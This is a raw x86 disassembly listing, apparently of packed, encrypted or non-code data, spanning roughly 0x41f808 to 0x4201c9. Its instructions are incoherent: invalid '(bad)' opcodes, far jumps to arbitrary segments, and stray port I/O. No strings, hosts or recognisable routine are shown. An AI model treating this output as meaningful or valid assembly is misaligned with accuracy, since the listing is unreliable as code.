  41f808:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41f80a:	imul   edi,DWORD PTR [ecx],0x76
  41f80d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f80e:	imul   esp,DWORD PTR [esi+0x608befc4],0x8d0478ae
  41f818:	pop    esp
  41f819:	inc    ebx
  41f81a:	push   edx
  41f81b:	jp     0x41f877
  41f81d:	xor    eax,0x60a5a73a
  41f822:	test   esp,0xb6fbe71d
  41f828:	rol    DWORD PTR [ecx+0x3b],cl
  41f82b:	xchg   ebp,eax
  41f82c:	fiadd  DWORD PTR [edx]
  41f82e:	xchg   edx,eax
  41f82f:	sbb    DWORD PTR [ebp+0x7ea92a0e],eax
  41f835:	mov    ebx,?
  41f837:	mov    eax,0x529963a8
  41f83c:	jnp    0x41f859
  41f83e:	sti    
  41f83f:	push   edx
  41f840:	xchg   edx,eax
  41f841:	push   ebx
  41f842:	ret    
  41f843:	mov    ebp,edi
  41f845:	mov    cl,0xd5
  41f847:	mov    ah,0x37
  41f849:	adc    eax,0x104fce64
  41f84f:	sub    bh,BYTE PTR [ebx-0x1d]
  41f852:	mov    bh,0x39
  41f854:	jne    0x41f87a
  41f856:	pop    ss
  41f857:	push   cs
  41f858:	fsubrp st(2),st
  41f85a:	and    al,bl
  41f85c:	adc    eax,0xd13cd026
  41f861:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f862:	fnstcw WORD PTR [edx]
  41f864:	lea    edx,[ebx-0x65750dae]
  41f86a:	imul   ebx,DWORD PTR [eax-0x74],0x5b
  41f86e:	(bad)  
  41f86f:	and    ebp,DWORD PTR [edi+0x5e]
  41f872:	mov    ds:0x156fb13,eax
  41f877:	jp     0x41f879
  41f879:	mov    ds:0x6947bb4d,eax
  41f87e:	out    0x11,al
  41f880:	addr16 jle 0x41f8e9
  41f883:	adc    ch,0x13
  41f886:	dec    ebx
  41f887:	je     0x41f8ab
  41f889:	jne    0x41f8b2
  41f88b:	push   edx
  41f88c:	mov    al,0x6e
  41f88e:	sar    DWORD PTR [ebp+eax*1-0x6a],1
  41f892:	xlat   BYTE PTR ds:[ebx]
  41f893:	call   0xd149:0x9418e980
  41f89a:	mov    ds:0x70115b6,eax
  41f89f:	pop    ecx
  41f8a0:	in     al,0xf8
  41f8a2:	jae    0x41f8c6
  41f8a4:	push   0x35
  41f8a6:	xchg   ebp,eax
  41f8a7:	js     0x41f846
  41f8a9:	mov    esp,0x63f23301
  41f8ae:	add    edx,DWORD PTR [ecx]
  41f8b0:	jge    0x41f91b
  41f8b2:	call   0x1172:0xd832e4e5
  41f8b9:	cmp    dh,BYTE PTR [ecx+0x3add92cb]
  41f8bf:	xor    al,0x35
  41f8c1:	dec    ecx
  41f8c2:	push   cs
  41f8c3:	and    dh,BYTE PTR ds:0xeec3727
  41f8c9:	and    DWORD PTR [edx-0x16],0x33
  41f8cd:	sub    DWORD PTR [eax+0x55],esi
  41f8d0:	push   ss
  41f8d1:	jge    0x41f855
  41f8d3:	mov    bl,0x35
  41f8d5:	mov    bh,0x87
  41f8d7:	pop    ss
  41f8d8:	sbb    eax,DWORD PTR [esi+edi*4]
  41f8db:	aaa    
  41f8dc:	dec    eax
  41f8dd:	leave  
  41f8de:	xor    DWORD PTR [esi-0x40],ebp
  41f8e1:	lea    ebx,[edi]
  41f8e3:	pop    ss
  41f8e4:	js     0x41f901
  41f8e6:	les    edx,FWORD PTR [ebx+esi*2-0xc]
  41f8ea:	mov    dh,al
  41f8ec:	cmp    esp,ecx
	...
  41f956:	mov    eax,ds:0x3b920b9a
  41f95b:	xchg   ebx,eax
  41f95c:	mov    ecx,0x4183febb
  41f961:	pop    edx
  41f962:	add    al,0x3f
  41f964:	jmp    0x1956096
  41f969:	add    BYTE PTR [eax],al
  41f96b:	add    DWORD PTR [eax],eax
  41f96d:	add    BYTE PTR [edi+0x3c],al
  41f970:	xor    bh,BYTE PTR [eax-0x19]
  41f973:	stos   DWORD PTR es:[edi],eax
  41f974:	icebp  
  41f975:	mov    ch,0x9f
  41f977:	and    esi,DWORD PTR [eax-0x5cf12337]
  41f97d:	cld    
  41f97e:	xchg   DWORD PTR [eax-0x32],esp
  41f981:	lock out 0x40,al
  41f984:	out    dx,eax
  41f985:	and    ebp,ebx
  41f987:	dec    esp
  41f988:	sbb    esp,DWORD PTR [esi-0x2c]
  41f98b:	mov    ds:0xb8ba05d7,eax
  41f990:	repnz cmc 
  41f992:	ret    0x9e
  41f995:	push   ss
  41f996:	int3   
  41f997:	xchg   BYTE PTR ds:0x45e59adc,bl
  41f99d:	pop    eax
  41f99e:	or     dl,al
  41f9a0:	ins    DWORD PTR es:[edi],dx
  41f9a1:	xchg   BYTE PTR [edi+0x72],dh
  41f9a4:	mov    eax,ds:0x54baca1f
  41f9a9:	and    ah,BYTE PTR [ecx+esi*2+0x41]
  41f9ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f9ae:	and    esi,ecx
  41f9b0:	scas   eax,DWORD PTR es:[edi]
  41f9b1:	fstp   DWORD PTR [ebx-0x4e649209]
  41f9b7:	mov    bl,0x20
  41f9b9:	xchg   edx,eax
  41f9ba:	dec    edx
  41f9bb:	push   eax
  41f9bc:	fld    QWORD PTR [edi]
  41f9be:	loope  0x41fa1e
  41f9c0:	pop    edi
  41f9c1:	mov    cl,0xd7
  41f9c3:	dec    ebx
  41f9c4:	pop    ebx
  41f9c5:	and    edi,DWORD PTR [edx]
  41f9c7:	inc    ebp
  41f9c8:	xor    BYTE PTR [ebx],ch
  41f9ca:	lods   eax,DWORD PTR ds:[esi]
  41f9cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9cc:	test   BYTE PTR [eax+0x74],dl
  41f9cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f9d0:	addr16 mov bh,0x1f
  41f9d3:	enter  0x7181,0xf4
  41f9d7:	and    BYTE PTR [esi+0x41c96d3],dh
  41f9dd:	iret   
  41f9de:	fist   DWORD PTR [edx]
  41f9e0:	and    DWORD PTR [ecx],0x19
  41f9e3:	in     al,dx
  41f9e4:	(bad)  
  41f9e5:	fldcw  WORD PTR [esi]
  41f9e7:	mov    BYTE PTR [edi+ebp*4],ch
  41f9ea:	cdq    
  41f9eb:	aad    0xf7
  41f9ed:	cmc    
  41f9ee:	dec    ecx
  41f9ef:	and    ecx,DWORD PTR [edx]
  41f9f1:	or     dh,BYTE PTR [ecx-0x3e]
  41f9f4:	jge    0x41fa59
  41f9f6:	hlt    
  41f9f7:	dec    eax
  41f9f8:	lods   eax,DWORD PTR ds:[esi]
  41f9f9:	fst    QWORD PTR [esi+0x5d58c8e5]
  41f9ff:	or     BYTE PTR [esi-0x3ad33fc5],cl
  41fa05:	mov    eax,ds:0x19a72a68
  41fa0a:	pop    esp
  41fa0b:	xchg   edi,eax
  41fa0c:	inc    ebx
  41fa0d:	mov    eax,ds:0xe75e4e43
  41fa12:	fdiv   st(4),st
  41fa14:	jno    0x41f9e5
  41fa16:	js     0x41fa1c
  41fa18:	push   ebp
  41fa19:	adc    eax,0x5c228ba5
  41fa1e:	cmp    cl,0x1c
  41fa21:	and    eax,0x5d18c9f8
  41fa26:	ret    0xa84f
  41fa29:	ror    BYTE PTR [ebp-0x2955adbc],1
  41fa2f:	call   0x5548114e
  41fa34:	les    edi,FWORD PTR [ecx+0x2c49141c]
  41fa3a:	retf   
  41fa3b:	jge    0x41f9e5
  41fa3d:	loopne 0x41fa5b
  41fa3f:	sub    bl,ah
  41fa41:	cmp    DWORD PTR [ebx+0x7a],esi
  41fa44:	pop    ebx
  41fa45:	popf   
  41fa46:	shr    al,0x33
  41fa49:	loop   0x41fa9d
  41fa4b:	sbb    esi,DWORD PTR [ebx]
  41fa4d:	cmp    DWORD PTR [ebx+ecx*1-0x13439ac5],ebx
  41fa54:	lock xchg ebx,eax
  41fa56:	loope  0x41fabd
  41fa58:	push   ebx
  41fa59:	add    bh,BYTE PTR [esp]
  41fa5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa5d:	xchg   ecx,eax
  41fa5e:	rol    BYTE PTR [ecx-0x3d739776],0xa4
  41fa65:	xor    bl,BYTE PTR [ebx+0x41]
  41fa68:	mov    edx,0xc79d7885
  41fa6d:	rol    BYTE PTR [eax],0x0
	...
  41fad4:	add    BYTE PTR [eax],al
  41fad6:	or     al,BYTE PTR [ecx-0x49]
  41fad9:	mov    eax,ds:0xeb1ef7ff
  41fade:	and    edx,DWORD PTR [edi-0x5d]
  41fae1:	adc    eax,0x78523dea
  41fae6:	addr16 push esp
  41fae8:	add    DWORD PTR [eax],eax
  41faea:	add    BYTE PTR [ecx],al
  41faec:	add    BYTE PTR [eax],al
  41faee:	push   es
  41faef:	test   DWORD PTR [edi+0x62],0xb8c015ef
  41faf6:	sbb    bl,BYTE PTR [eax]
  41faf8:	adc    dl,BYTE PTR [ebp+eiz*8-0x3]
  41fafc:	adc    al,0x7c
  41fafe:	mov    ebp,0xb0aeec3e
  41fb03:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41fb05:	daa    
  41fb06:	add    BYTE PTR [edi-0x698a2c8a],dl
  41fb0c:	push   ebx
  41fb0d:	stos   BYTE PTR es:[edi],al
  41fb0e:	stos   DWORD PTR es:[edi],eax
  41fb0f:	js     0x41fb15
  41fb11:	cmp    al,0x19
  41fb13:	or     bl,BYTE PTR [eax]
  41fb15:	xor    esp,DWORD PTR [ecx+eiz*2]
  41fb18:	fcomp  QWORD PTR [ecx+0x1b8586a1]
  41fb1e:	inc    edi
  41fb1f:	dec    edi
  41fb20:	jle    0x41fb48
  41fb22:	push   esp
  41fb23:	cmc    
  41fb24:	cmp    eax,0x16cc5e11
  41fb29:	dec    eax
  41fb2a:	loope  0x41faf0
  41fb2c:	ins    DWORD PTR es:[edi],dx
  41fb2d:	jmp    0x41faf6
  41fb2f:	or     bl,dl
  41fb31:	and    ecx,DWORD PTR [ebp+0x56]
  41fb34:	xchg   edx,eax
  41fb35:	inc    edi
  41fb36:	push   ebx
  41fb37:	je     0x41fb45
  41fb39:	shl    DWORD PTR [edi+0x1b],0xe
  41fb3d:	bnd ret 
  41fb3f:	push   ss
  41fb40:	adc    BYTE PTR [eax],dh
  41fb42:	dec    edi
  41fb43:	add    DWORD PTR [ecx+0x22],ebp
  41fb46:	adc    BYTE PTR [esi+edi*4-0x2898de47],0xdf
  41fb4e:	jmp    0x43a7:0x6a019f71
  41fb55:	outs   dx,DWORD PTR ds:[esi]
  41fb56:	sbb    al,BYTE PTR [ebp-0x6b]
  41fb59:	mov    al,ds:0x60787151
  41fb5e:	mov    ds:0x6908950e,al
  41fb63:	and    al,0x91
  41fb65:	jne    0x41fb4d
  41fb67:	jmp    0xb61c:0x129fb7cb
  41fb6e:	add    ebx,ebp
  41fb70:	adc    ebp,DWORD PTR [ecx-0x7bda7676]
  41fb76:	ins    DWORD PTR es:[edi],dx
  41fb77:	cmp    ebx,DWORD PTR [edx]
  41fb79:	pop    ss
  41fb7a:	fld    QWORD PTR [edx+0x5503f201]
  41fb80:	test   BYTE PTR [edx-0x22],bh
  41fb83:	pushf  
  41fb84:	push   esi
  41fb85:	cmc    
  41fb86:	pop    esi
  41fb87:	(bad)  
  41fb88:	nop
  41fb89:	or     bl,BYTE PTR [edx-0xd4f1e2f]
  41fb8f:	mov    ah,0x34
  41fb91:	ins    BYTE PTR es:[edi],dx
  41fb92:	pop    ecx
  41fb93:	cli    
  41fb94:	pop    edx
  41fb95:	les    ebx,FWORD PTR [ecx-0x26a4f572]
  41fb9b:	popf   
  41fb9c:	mov    eax,ds:0x113a2cf1
  41fba1:	(bad)  
  41fba2:	push   cs
  41fba3:	mov    ebx,0xf6cac7c5
  41fba8:	in     al,0x49
  41fbaa:	retf   
  41fbab:	mov    cl,0xfb
  41fbad:	pusha  
  41fbae:	lahf   
  41fbaf:	(bad)  
  41fbb1:	icebp  
  41fbb2:	pop    esp
  41fbb3:	mov    ebp,esi
  41fbb5:	add    ebp,DWORD PTR [eiz*8-0x7d13f1b1]
  41fbbc:	sbb    DWORD PTR [esi-0x3e],ebp
  41fbbf:	mov    cl,0xd4
  41fbc1:	xchg   ecx,eax
  41fbc2:	push   esi
  41fbc3:	popf   
  41fbc4:	dec    esp
  41fbc5:	pop    ebx
  41fbc6:	out    dx,al
  41fbc7:	outs   dx,BYTE PTR ds:[esi]
  41fbc8:	pop    ebp
  41fbc9:	or     bl,BYTE PTR [eax]
  41fbcb:	int    0xa8
  41fbcd:	or     al,0x38
  41fbcf:	dec    ecx
  41fbd0:	scas   al,BYTE PTR es:[edi]
  41fbd1:	jb     0x41fbcd
  41fbd3:	mov    al,ds:0x5b5cf4c4
  41fbd8:	mov    cl,BYTE PTR [esi]
  41fbda:	and    eax,0x25a03511
  41fbdf:	mov    DWORD PTR [ebp+0x39832885],esi
  41fbe5:	xchg   ecx,eax
  41fbe6:	pop    eax
  41fbe7:	xor    esp,0xffffffe7
  41fbea:	(bad)  
  41fbeb:	push   ecx
  41fbec:	rol    BYTE PTR [ebp+0x0],0x0
	...
  41fc53:	add    BYTE PTR [eax],al
  41fc55:	add    ah,bl
  41fc57:	sub    BYTE PTR [edx-0x119011c],cl
  41fc5d:	cmp    BYTE PTR [esi],ah
  41fc5f:	ret    
  41fc60:	or     DWORD PTR [esi],edx
  41fc62:	pop    edi
  41fc63:	std    
  41fc64:	fcmovu st,st(5)
  41fc66:	addr16 push ebp
  41fc68:	add    DWORD PTR [eax],eax
  41fc6a:	add    BYTE PTR [ecx],al
  41fc6c:	add    BYTE PTR [eax],al
  41fc6e:	out    0xf8,eax
  41fc70:	xchg   ebp,eax
  41fc71:	loopne 0x41fc85
  41fc73:	mov    bh,0x60
  41fc75:	in     al,dx
  41fc76:	jecxz  0x41fce5
  41fc78:	push   eax
  41fc79:	jmp    0xa35b9c83
  41fc7e:	outs   dx,BYTE PTR ds:[esi]
  41fc7f:	push   ds
  41fc80:	je     0x41fcd0
  41fc82:	arpl   WORD PTR [edi+eax*2+0x3aa33738],cx
  41fc89:	out    0xe,eax
  41fc8b:	jne    0x41fc86
  41fc8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc8e:	adc    DWORD PTR [ecx+0x63],0x18
  41fc92:	cli    
  41fc93:	stos   DWORD PTR es:[edi],eax
  41fc94:	loope  0x41fc4e
  41fc96:	adc    edx,DWORD PTR [ebp-0x58]
  41fc99:	ficom  WORD PTR [edx+0x22ced0b6]
  41fc9f:	sub    dl,BYTE PTR [edi+ebx*2-0x2f76e0cc]
  41fca6:	mov    dh,0xd1
  41fca8:	xor    esp,DWORD PTR [esi+0x7a2c5057]
  41fcae:	add    BYTE PTR [eax-0xd],0x20
  41fcb2:	shl    BYTE PTR [ebx],cl
  41fcb4:	out    0xf1,eax
  41fcb6:	sub    BYTE PTR [esi-0x38547970],bl
  41fcbc:	adc    al,0x14
  41fcbe:	sub    ebp,DWORD PTR [ebp+0x4]
  41fcc1:	cmp    BYTE PTR [edi+edi*4-0x36],0x58
  41fcc6:	cmp    BYTE PTR [edi],ah
  41fcc8:	mov    eax,ds:0xe251c63d
  41fccd:	sbb    ecx,DWORD PTR [eiz*2-0x21d59df]
  41fcd4:	mov    al,ds:0xdfd7b836
  41fcd9:	hlt    
  41fcda:	dec    eax
  41fcdb:	nop
  41fcdc:	popa   
  41fcdd:	jmp    0x8986356c
  41fce2:	mov    cl,0xf6
  41fce4:	rcr    BYTE PTR [eax+0x9db1886],1
  41fcea:	adc    BYTE PTR [ebx-0x4f],ch
  41fced:	push   ds
  41fcee:	sbb    eax,0xa9d1e20c
  41fcf3:	clc    
  41fcf4:	inc    esp
  41fcf5:	cld    
  41fcf6:	or     ch,al
  41fcf8:	jecxz  0x41fcec
  41fcfa:	pop    ecx
  41fcfb:	pushf  
  41fcfc:	fwait
  41fcfd:	xor    eax,ecx
  41fcff:	sbb    al,BYTE PTR ds:[ecx-0x50]
  41fd03:	sbb    BYTE PTR [ecx-0x5c4d4749],0x4c
  41fd0a:	xchg   ebx,eax
  41fd0b:	adc    eax,0xb7e103ad
  41fd10:	xor    BYTE PTR [eax-0x69],dh
  41fd13:	mov    ebp,0xa95d479c
  41fd18:	jb     0x41fced
  41fd1a:	(bad)  
  41fd1b:	retf   
  41fd1c:	push   esi
  41fd1d:	mov    eax,0xff030554
  41fd22:	cmp    DWORD PTR [edx],esp
  41fd24:	add    cl,BYTE PTR [edi+ebp*8-0x7554cfac]
  41fd2b:	push   0x7b0ffdca
  41fd30:	stos   BYTE PTR es:[edi],al
  41fd31:	or     bl,cl
  41fd33:	fimul  DWORD PTR [ebx]
  41fd35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd36:	retf   0xcc7c
  41fd39:	inc    edi
  41fd3a:	mov    eax,0x884e9929
  41fd3f:	pop    eax
  41fd40:	cmp    al,BYTE PTR [edx]
  41fd42:	repnz mov bh,0x6d
  41fd45:	add    ch,ch
  41fd47:	inc    edx
  41fd48:	mov    ah,0xb9
  41fd4a:	mov    eax,0xa1fe7aae
  41fd4f:	sbb    eax,0xa90d94b2
  41fd54:	pop    ebx
  41fd55:	or     esi,DWORD PTR [ebp-0x6ef4b1dc]
  41fd5b:	sbb    al,0x95
  41fd5d:	push   0xffffffc6
  41fd5f:	push   edi
  41fd60:	mov    esp,0x3ceeedf3
  41fd65:	sbb    ecx,DWORD PTR [ecx]
  41fd67:	mov    al,ds:0xf5f9bab1
  41fd6c:	lods   al,BYTE PTR ds:[esi]
  41fd6d:	push   esi
	...
  41fdd6:	or     al,0x6a
  41fdd8:	push   edx
  41fdd9:	shl    DWORD PTR [esi-0x7],0x9f
  41fddd:	out    dx,eax
  41fdde:	pop    ds
  41fddf:	pop    edx
  41fde0:	pushf  
  41fde1:	push   ss
  41fde2:	push   0x67d39897
  41fde7:	push   esi
  41fde8:	add    DWORD PTR [eax],eax
  41fdea:	add    BYTE PTR [ecx],al
  41fdec:	add    BYTE PTR [eax],al
  41fdee:	mov    dh,BYTE PTR [ebx]
  41fdf0:	and    esp,esp
  41fdf2:	push   ebx
  41fdf3:	adc    al,al
  41fdf5:	mov    es,WORD PTR [eax+0x60]
  41fdf8:	mov    al,ds:0x1613dc10
  41fdfd:	jle    0x41fdd1
  41fdff:	xor    ecx,DWORD PTR [eax]
  41fe01:	mov    ebp,0x6a8d5858
  41fe06:	and    BYTE PTR [ebx-0x66c306f6],bl
  41fe0c:	shl    edi,1
  41fe0e:	lea    esi,es:[edi+edx*2+0x66]
  41fe13:	addr16 push ss
  41fe15:	xchg   edi,eax
  41fe16:	push   eax
  41fe17:	push   0x208ff25a
  41fe1c:	jbe    0x41fe22
  41fe1e:	xchg   edx,eax
  41fe1f:	call   0x1be3:0xf359f9dd
  41fe26:	sub    al,0x75
  41fe28:	je     0x41fe09
  41fe2a:	clc    
  41fe2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe2c:	aaa    
  41fe2d:	mov    cl,0x1d
  41fe2f:	cmp    eax,0x7a317349
  41fe34:	mov    cl,0xe5
  41fe36:	pop    ds
  41fe37:	cmp    eax,0x3f868706
  41fe3c:	cld    
  41fe3d:	or     edi,ebp
  41fe3f:	mul    BYTE PTR [esi]
  41fe41:	or     DWORD PTR [edx-0x3a],esi
  41fe44:	cmc    
  41fe45:	adc    BYTE PTR [edi-0x1f3c7349],al
  41fe4b:	loope  0x41fdd9
  41fe4d:	sbb    DWORD PTR [edi+0x46024ae6],eax
  41fe53:	aam    0xcb
  41fe55:	arpl   WORD PTR [ecx+0x69],dx
  41fe58:	test   DWORD PTR [esi+eax*4-0xb5d92c3],ecx
  41fe5f:	pop    ecx
  41fe60:	dec    ecx
  41fe61:	jle    0x41fe0d
  41fe63:	add    eax,0xbd497995
  41fe68:	and    ah,BYTE PTR [esi+esi*4]
  41fe6b:	outs   dx,BYTE PTR ds:[esi]
  41fe6c:	xor    ah,BYTE PTR [ecx-0x39c6347f]
  41fe72:	aas    
  41fe73:	jne    0x41fed7
  41fe75:	dec    eax
  41fe76:	mov    dl,cl
  41fe78:	mov    ch,0x6b
  41fe7a:	lods   al,BYTE PTR ds:[esi]
  41fe7b:	inc    ecx
  41fe7c:	mov    al,0x79
  41fe7e:	xor    al,0xdc
  41fe80:	add    al,0x50
  41fe82:	adc    bl,dl
  41fe84:	shl    DWORD PTR [eax-0xe55ea1b],cl
  41fe8a:	push   edx
  41fe8b:	adc    al,BYTE PTR [ecx-0x60]
  41fe8e:	fild   WORD PTR es:[ecx+0x2bce5f15]
  41fe95:	lods   eax,DWORD PTR ds:[esi]
  41fe96:	imul   edi,DWORD PTR [ecx+0x448bc66d],0x904154e5
  41fea0:	mov    es:0x4fe87bed,al
  41fea6:	jmp    0x11dd038b
  41feab:	inc    ecx
  41feac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fead:	adc    BYTE PTR [edx+0x8],al
  41feb0:	inc    ebp
  41feb1:	push   ss
  41feb2:	and    dl,BYTE PTR [ecx]
  41feb4:	cs pop ds
  41feb6:	cmp    eax,0x3db8e1c9
  41febb:	push   es
  41febc:	out    dx,eax
  41febd:	in     eax,dx
  41febe:	inc    esi
  41febf:	push   ebx
  41fec0:	loop   0x41fe51
  41fec2:	mov    esp,ebx
  41fec4:	in     al,0x9b
  41fec6:	pop    esp
  41fec7:	test   BYTE PTR [edx],dl
  41fec9:	pop    ecx
  41feca:	aaa    
  41fecb:	and    ch,BYTE PTR [eax-0x128675a7]
  41fed1:	mov    eax,ds:0xc3744bd
  41fed6:	shl    DWORD PTR [ecx],cl
  41fed8:	test   DWORD PTR [ebx+0x55],esi
  41fedb:	ret    0xa20d
  41fede:	mov    esp,0x6f5d4f65
  41fee3:	sbb    al,0x6a
  41fee5:	ins    DWORD PTR es:[edi],dx
  41fee6:	aas    
  41fee7:	xchg   DWORD PTR [esi+0x6c],ecx
  41feea:	bound  ebp,QWORD PTR ss:[ebp+0xdb]
	...
  41ff55:	add    BYTE PTR [edx-0x1865ab],ch
  41ff5b:	out    dx,eax
  41ff5c:	call   FWORD PTR [ebp-0x5]
  41ff5f:	(bad)  
  41ff60:	hlt    
  41ff61:	mov    ah,0x1
  41ff63:	pop    ecx
  41ff64:	pop    esp
  41ff65:	lock addr16 push edi
  41ff68:	add    DWORD PTR [eax],eax
  41ff6a:	add    BYTE PTR [ecx],al
  41ff6c:	add    BYTE PTR [eax],al
  41ff6e:	sbb    BYTE PTR [ebp-0x25aeaead],0xfd
  41ff75:	mov    ebp,0xc86d846
  41ff7a:	call   0xf5c57cb4
  41ff7f:	mov    edx,DWORD PTR [ecx-0x61]
  41ff82:	cwde   
  41ff83:	jae    0x41ff2d
  41ff85:	dec    esp
  41ff86:	sahf   
  41ff87:	sub    al,0x90
  41ff89:	mov    BYTE PTR ds:0x14bfe5d9,0x7c
  41ff90:	or     bl,BYTE PTR [edx]
  41ff92:	xor    DWORD PTR [ebx],ebp
  41ff94:	inc    eax
  41ff95:	add    edx,DWORD PTR ds:0x87feeb43
  41ff9b:	add    dl,ah
  41ff9d:	test   edx,esp
  41ff9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ffa0:	pop    es
  41ffa1:	sbb    BYTE PTR [edi+0x4c],bl
  41ffa4:	inc    edx
  41ffa5:	dec    DWORD PTR [eax-0x18]
  41ffa8:	stos   BYTE PTR es:[edi],al
  41ffa9:	push   esp
  41ffaa:	ret    0xd975
  41ffad:	mov    ds:0x49252abf,al
  41ffb2:	lds    ebp,FWORD PTR [ebx-0x1358f0b4]
  41ffb8:	fmul   DWORD PTR [edx+0x65]
  41ffbb:	mov    BYTE PTR ds:[esi],bh
  41ffbe:	and    eax,0xa4423104
  41ffc3:	lods   al,BYTE PTR ds:[esi]
  41ffc4:	shl    DWORD PTR [edx],0x3e
  41ffc7:	ror    BYTE PTR [ecx+0x59],cl
  41ffca:	jg     0x41ffce
  41ffcc:	pushf  
  41ffcd:	jae    0x420047
  41ffcf:	iret   
  41ffd0:	std    
  41ffd1:	mov    ebp,0xb21437b6
  41ffd6:	add    ecx,DWORD PTR [eax]
  41ffd8:	pop    edi
  41ffd9:	fpatan 
  41ffdb:	mov    ?,ebp
  41ffdd:	adc    edx,DWORD PTR [eax-0x75467285]
  41ffe3:	cmp    ecx,0x5a8f421a
  41ffe9:	imul   esi
  41ffeb:	(bad)  
  41ffed:	loope  0x41ffad
  41ffef:	jge    0x42006b
  41fff1:	mov    al,0xcb
  41fff3:	mov    cs:0xdef6ae3,al
  41fff9:	sar    eax,cl
  41fffb:	clc    
  41fffc:	xor    edx,DWORD PTR [ebp+0x70436ca4]
  420002:	mov    cl,0x87
  420004:	clc    
  420005:	mov    cl,0x46
  420007:	(bad)  
  420008:	mov    dl,0xaf
  42000a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42000b:	loop   0x41ff9c
  42000d:	(bad)  
  42000e:	sbb    cl,BYTE PTR [esi-0x52]
  420011:	call   FWORD PTR [eax+0x46]
  420014:	psubq  mm0,mm5
  420017:	sbb    eax,0xcac39491
  42001c:	push   esp
  42001d:	jne    0x42003c
  42001f:	ss test eax,0x77cad6cf
  420025:	pop    esp
  420026:	mov    bh,0x75
  420028:	mov    dl,0x5e
  42002a:	lahf   
  42002b:	gs dec ebx
  42002d:	mov    esi,0xb679ae27
  420032:	fwait
  420033:	inc    ebp
  420034:	dec    esp
  420035:	mov    ah,0x29
  420037:	fcom   QWORD PTR [edi+0x58fa916c]
  42003d:	mov    BYTE PTR [edi*8+0x6f6d3ebc],bl
  420044:	in     eax,0x4e
  420046:	fsub   QWORD PTR [ebx-0x270f4040]
  42004c:	inc    ebp
  42004d:	in     al,dx
  42004e:	sbb    al,0x13
  420050:	or     ebx,ebx
  420052:	xchg   esp,eax
  420053:	addr16 in eax,dx
  420055:	dec    esp
  420056:	nop
  420057:	pusha  
  420058:	(bad)  
  420059:	sub    al,0x1e
  42005b:	clc    
  42005c:	mov    edi,0xb8466bea
  420061:	aad    0x37
  420063:	(bad)  
  420064:	jg     0x420087
  420066:	jo     0x420060
  420068:	and    dl,BYTE PTR [esi+0x47]
  42006b:	cmp    al,0xcc
  42006d:	pop    edi
	...
  4200d6:	bound  esp,QWORD PTR [ebp-0x8808a]
  4200dc:	imul   edi,DWORD PTR [ebp-0x6d81eb08],0x69
  4200e3:	or     ah,bl
  4200e5:	add    al,0x67
  4200e7:	pop    eax
  4200e8:	add    DWORD PTR [eax],eax
  4200ea:	add    BYTE PTR [ecx],al
  4200ec:	add    BYTE PTR [eax],al
  4200ee:	and    DWORD PTR [eax],esp
  4200f0:	xlat   BYTE PTR ds:[ebx]
  4200f1:	jns    0x42007b
  4200f3:	inc    ebp
  4200f4:	push   esp
  4200f5:	xor    BYTE PTR [ebx],bl
  4200f7:	lods   eax,DWORD PTR ds:[esi]
  4200f8:	mov    ah,0xe
  4200fa:	nop
  4200fb:	pop    esp
  4200fc:	adc    esp,esi
  4200fe:	mov    eax,0x4fa7bcbf
  420103:	ss push esi
  420105:	adc    eax,0x5e30953d
  42010a:	bound  esp,QWORD PTR [ebx]
  42010c:	sbb    BYTE PTR ds:0x2d93c3ba,0x9b
  420113:	sar    esp,cl
  420115:	retf   0xa208
  420118:	jmp    0x77c7:0x121ed2af
  42011f:	data16 (bad) 
  420121:	int3   
  420122:	add    bh,BYTE PTR [edx+0x69891b25]
  420128:	mov    dh,0xec
  42012a:	jmp    0xc8060a56
  42012f:	loop   0x420162
  420131:	test   BYTE PTR [eax-0x744ede31],al
  420137:	das    
  420138:	mov    dl,0xfd
  42013a:	xor    al,0x88
  42013c:	outs   dx,DWORD PTR ds:[esi]
  42013d:	mov    esi,0x7b728456
  420142:	inc    ebp
  420143:	mov    al,ds:0x6abf0021
  420148:	addr16 inc ebx
  42014a:	cmp    BYTE PTR [edi+0x5c],dl
  42014d:	dec    esi
  42014e:	push   0x34d4a2e0
  420153:	adc    eax,0xb95b1402
  420158:	xchg   DWORD PTR [ebx-0x5262e649],ecx
  42015e:	jmp    DWORD PTR [ecx]
  420160:	sbb    BYTE PTR [ebx-0x15b095d1],al
  420166:	sti    
  420167:	leave  
  420168:	pop    es
  420169:	inc    ebp
  42016a:	jg     0x4201b9
  42016c:	test   DWORD PTR [eax+0x71],0x7c81d947
  420173:	xchg   BYTE PTR [esi+0x8],al
  420176:	aam    0x59
  420178:	outs   dx,DWORD PTR ds:[esi]
  420179:	jmp    0x8f758a6e
  42017e:	in     al,0xda
  420180:	nop
  420181:	out    dx,al
  420182:	daa    
  420183:	jno    0x4201f0
  420185:	push   ebp
  420186:	aaa    
  420187:	inc    ecx
  420188:	fiadd  DWORD PTR [edi-0x3e]
  42018b:	add    cl,0x57
  42018e:	mov    eax,0x100643ea
  420193:	sub    eax,0xafa2027a
  420198:	dec    esi
  420199:	call   0xba48:0xd9b2aa5f
  4201a0:	cmp    eax,ebp
  4201a2:	mov    BYTE PTR [edi-0x2d],cl
  4201a5:	test   eax,0xdf64aaa4
  4201aa:	out    dx,eax
  4201ab:	retf   
  4201ac:	xchg   edx,eax
  4201ad:	in     eax,dx
  4201ae:	imul   ebp,DWORD PTR [esi],0x69
  4201b1:	ins    BYTE PTR es:[edi],dx
  4201b2:	inc    eax
  4201b3:	out    dx,al
  4201b4:	out    0x14,eax
  4201b6:	xor    DWORD PTR [ecx],ebp
  4201b8:	imul   ebp,DWORD PTR [ebp-0x407609be],0xffffffc4
  4201bf:	push   esi
  4201c0:	adc    DWORD PTR [edx],0xae9f4d30
  4201c6:	push   edi
  4201c7:	fdiv   st,st(6)
  4201c9:	jns    0x420233
